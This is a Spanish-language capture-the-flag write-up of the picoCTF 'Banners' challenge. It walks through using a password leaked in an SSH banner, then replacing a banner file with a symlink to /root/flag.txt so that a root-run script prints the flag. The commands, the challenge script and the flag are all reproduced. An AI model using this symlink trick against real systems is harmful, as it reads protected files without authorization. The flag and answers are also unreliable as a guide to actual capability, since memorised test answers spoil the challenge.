### Descripción
Can you abuse the banner?

Additional details will be available after launching your challenge instance.
#### Una vez iniciada la instancia del desafío:
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 51796`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 62968`. From the above information abuse the machine and find the flag in the /root directory.
### Solución
Iniciamos con la conexión al servidor proporcionado después de tener iniciada la instancia del reto:

```shell
jony@DESKTOP-TN1UVD2:~/Examen_1_GS/Banners$ nc tethys.picoctf.net 51796
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Como podemos ver, este servidor nos mostró la contraseña que vamos a usar para podernos conectar, por lo que ahora probamos con el otro servidor:

```shell
jony@DESKTOP-TN1UVD2:~/Examen_1_GS/Banners$ nc tethys.picoctf.net 62968
*************************************
**************WELCOME****************
*************************************

what is the password?
```

En este caso el servidor nos condujo a la aplicación como tal, donde se nos pide la contraseña (la cual habíamos obtenido anteriormente), donde una vez ingresada debemos responder una serie de preguntas para acceder a la consola que nos permita manipular los directorios:

```shell
what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Sí hemos respondido correctamente a la preguntas anteriores se nos desplegará ahora el prompt indicando que ya podremos ejecutar comandos, siendo el primero **ls -al**, para poder ver los archivos y permisos que hay en el directorio actual.

```shell
player@challenge:~$ ls -al
ls -al
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
```

Se hacen pruebas para determinar el contenido de dos archivos, siendo estos "banner" y "text", lo anterior con el comando **cat**:

```shell
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
```

Ahora procedemos a revisar el contenido en el directorio raíz, donde podemos ver dos archivos que podemos consultar: "flag.txt" y "script.py":

```shell
player@challenge:~$ ls -al /root
ls -al /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Apr 10 04:03 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
```

Dado que por los permisos que contiene **flag.txt**, no nos es posible revisarlo, procedemos a hacer un cat al script de python:

```shell
player@challenge:~$ cat /root/script.py
cat /root/script.py
```

Obteniendo el siguiente código:

```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

Como en el código nos dice algo de reemplazar el banner en cierto directorio, procedemos a aplicar un comando **rm** en dicho directorio, seguido de la creación de un enlace simbólico, puesto que cuando el usuario deseé acceder al banner, en realidad lo estará haciendo a **flag.txt**:

```shell
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

Por lo que terminamos la conexión con el servidor para iniciar otra y ver si nuestro cambio surtió efecto:

```shell
jony@DESKTOP-TN1UVD2:~/Examen_1_GS/Banners$ nc tethys.picoctf.net 62968
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password?
```

Como podemos ver, resultó favorable, puesto que nos arrojó la bandera que da solución al reto:

```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```
### Notas Adicionales

### Referencias